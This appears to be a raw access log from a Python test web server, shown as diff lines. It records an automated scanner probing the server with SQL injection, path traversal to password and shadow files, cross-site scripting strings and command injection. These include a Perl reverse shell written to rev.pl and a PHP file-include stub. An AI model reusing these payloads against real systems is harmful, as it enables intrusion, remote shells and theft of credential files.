+185.238.32.132 - - [24/Feb/2021 17:24:15] "GET /%2B37046267662 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:16] "GET /%20RLIKE%20(SELECT%20(CASE%20WHEN%20(4346%3D4346)%20THEN%200x61646d696e%20ELSE%200x28%20END))%20AND%20'Txws'%3D' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:16] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:16] "GET /%2B7%20499%20638-20-13 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:17] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fetc%2Fpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:17] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:17] "GET /%2F..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fpasswd HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 52212)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:24:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:18] "GET /%20OR%20x%3Dy--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:18] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:18] "GET /%26%26%20ls%20-laR%20%2Fvar%2Fwww HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:19] "GET /bin.tar HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:19] "GET /%20ORDER%20BY%208%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:19] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:19] "GET /%3Csvg%2Fonload%3Dalert(%60INJECTX%60)%3E HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 52218)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:24:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:20] "GET /%26%20ifconfig HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:20] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:20] "GET /%2Fboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:21] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:21] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:21] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:21] "GET /%20ORDER%20BY%203%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:22] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:22] "GET /pwn.php HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:22] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:22] "GET /%26%26%20type%20C%3A%5CWINNT%5Crepair%5CSAM HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:23] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:23] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:23] "GET /%26%26%20echo%20%22use%20Socket%3B%24i%3D%22192.168.16.151%22%3B%24p%3D443%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%22%20%3E%20rev.pl HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:24] "GET /%2Fetc%2Fissue HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:24] "GET /%20AND%201%3D0%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:24] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:24] "GET /%20ORDER%20BY%206%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:25] "GET /8%20499%20677%2056%2024 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:25] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:25] "GET /javascript%3Aalert(1)%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:26] "GET /%20ORDER%20BY%2030%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:26] "GET /%26%26%20uname%20-a HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:26] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:26] "GET /8%20906%20229%2071%2067 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:27] "GET /%2Fetc%2Fpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:27] "GET /%20ORDER%20BY%2026%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:27] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:27] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fshadow%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:28] "GET /%3Csvg%2Fonload%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:28] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:28] "GET /%2F..........................................................................%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%2Fpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:29] "GET /%20ORDER%20BY%202%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:29] "GET /'%20%26%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:29] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:29] "GET /%3Cmarquee%20loop%3D1%20width%3D0%20onfinish%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:30] "GET /js.jsp HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:30] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:30] "GET /%3Cbutton%20form%3Dtest%20onformchange%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:31] "GET /%2Fetc%2Fhosts%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:31] "GET /%2B7%20499%20530-54-78 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:31] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:31] "GET /1.php3 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:32] "GET /%26%26%20echo%20%22%3C%3Fphp%20include(%24_GET%5B'page'%5D)%3B%20%3F%3E%22%20%3E%20rfi.php HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:32] "GET /%26%26%20dir%20C%3A%5CUsers HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:32] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:32] "GET /%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:33] "GET /%20ORDER%20BY%2028--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:33] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:33] "GET /8%20958%20577%2093%2000 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:34] "GET /%2Fetc%2Fmotd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:34] "GET /%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:24:34] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:34] "GET /%2B74953740142 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:35] "GET /%20ORDER%20BY%2019--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:35] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:35] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:36] "GET /%3Csvg%3E%3Cscript%3E%2F%3C%40%2F%3Ealert(1)%3C%2Fscript%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:36] "GET /%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fhosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:36] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:36] "GET /%20ORDER%20BY%2031337--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:37] "GET /%20ORDER%20BY%205%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:37] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:37] "GET /%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:38] "GET /%3Csvg%2Fonload%3Dalert(%2FINJECTX%2F)%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:38] "GET /%3Ch1%2Fonclick%3Dalert(1)%3Ea%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:38] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:38] "GET /%26%26%20systeminfo HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:39] "GET /%20WHERE%201%3D1%20AND%201%3D0-- HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:39] "GET /8%20909%20386%2097%2043 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:39] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:39] "GET /%20ORDER%20BY%2016%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:40] "GET /%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:24:40] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:40] "GET /5555555555554444 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:41] "GET /%25'%20AND%208310%3D8310%20AND%20'%25'%3D' HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:41] "GET /%26%20ls%20-l%20%2Fhome%2F* HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:41] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:41] "GET /%20ORDER%20BY%2021%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:42] "GET /%20ORDER%20BY%2027%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:42] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:42] "GET /%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2F%252E%252E%2Fetc%2Fhosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:43] "GET /xxx.txt HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:43] "GET /%3Cimg%2Fsrc%3D'x'onerror%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:43] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:43] "GET /%3Cp%2Fonclick%3Dalert(%2FINJECTX%2F)%3Ea HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:44] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cshadow%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:44] "GET /%2B7%209681425545 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:44] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:44] "GET /%20ORDER%20BY%2029%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:45] "GET /%26%26%20ifconfig HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:45] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:45] "GET /%2B7%209052315547 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:46] "GET /%2B7%209018082114 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:46] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:46] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:46] "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:47] "GET /%20HAVING%201%3D0%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:47] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:47] "GET /%7C%20ls%20-laR%20%2Fvar%2Fwww HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:48] "GET /%26%26%20sleep%201 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:48] "GET /%3Ckeygen%20autofocus%20onfocus%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:48] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:48] "GET /C%3A%5Cboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:49] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:49] "GET /%26%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:49] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:49] "GET /%3Csvg%2Fonload%3Dalert%60INJECTX%60%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:50] "GET /%3Cvideo%20onerror%3D%22javascript%3Aalert(1)%22%3E%3Csource%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:50] "GET /%2B7%209242413490 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:50] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:50] "GET /%22%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:51] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:24:51] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:51] "GET /%20ORDER%20BY%2016%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:51] "GET /%2F..%2F..%2F..%2F HTTP/1.1" 301 -
+185.238.32.132 - - [24/Feb/2021 17:24:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:52] "GET /%2B37031525309 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:52] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:52] "GET /%3C!--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%2F%2F%22%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:53] "GET /%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:53] "GET /%26%26%20sysinfo HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:53] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:53] "GET /%2B7%20343%20220%203737 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:54] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:54] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:54] "GET /%2Fetc%2Fshadow HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:55] "GET /%2B7%20800%20222-04-80 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:55] "GET /%20OR%20x%3Dx HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:55] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:55] "GET /%2B7%20958%205381045 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:56] "GET /%20ORDER%20BY%2010%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:56] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:56] "GET /8%20958%20538%2003%2029 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:57] "GET /%2B79061733288 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:57] "GET /%2B7%20922%20829%2025%2052 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:57] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:57] "GET /%3Ch1%3EINJECTX%3C%2Fh1%3E HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:58] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:58] "GET /%22%20%7C%20whoami HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:58] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:58] "GET /%2B7%209675551593 HTTP/1.1" 404 -
+----------------------------------------
+Exception happened during processing of request from ('185.238.32.132', 52322)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 320, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 351, in process_request
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/lib/python3.6/http/server.py", line 418, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.6/http/server.py", line 406, in handle_one_request
+    method()
+  File "/usr/lib/python3.6/http/server.py", line 636, in do_GET
+    f = self.send_head()
+  File "/usr/lib/python3.6/http/server.py", line 662, in send_head
+    if os.path.isdir(path):
+  File "/usr/lib/python3.6/genericpath.py", line 42, in isdir
+    st = os.stat(s)
+UnicodeEncodeError: 'ascii' codec can't encode character '\u202d' in position 6: ordinal not in range(128)
+----------------------------------------
+185.238.32.132 - - [24/Feb/2021 17:24:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:59] "GET /%20ORDER%20BY%2028%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:24:59] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:24:59] "GET /py.py HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:00] "GET /%20ORDER%20BY%2019%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:00] "GET /%2F..........................................................................%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:00] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:00] "GET /%20ORDER%20BY%2017%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:01] "GET /%20ORDER%20BY%2015--%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:01] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:01] "GET /%20ORDER%20BY%2011%23%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:02] "GET /%20HAVING%201%3D1%23 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:02] "GET /%2F..........................................................................%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini%2500 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:02] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:02] "GET /4012888888881881 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:03] "GET /%3Ctextarea%20autofocus%20onfocus%3Dalert(1)%3E%2F%2FINJECTX HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:03] "GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:03] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:03] "GET /%20ORDER%20BY%203%20 HTTP/1.1" 404 -
+185.238.32.132 - - [24/Feb/2021 17:25:04] code 404, message File not found
+185.238.32.132 - - [24/Feb/2021 17:25:04] "GET /%20ORDER%20BY%2026--%20 HTTP/1.1" 404 -
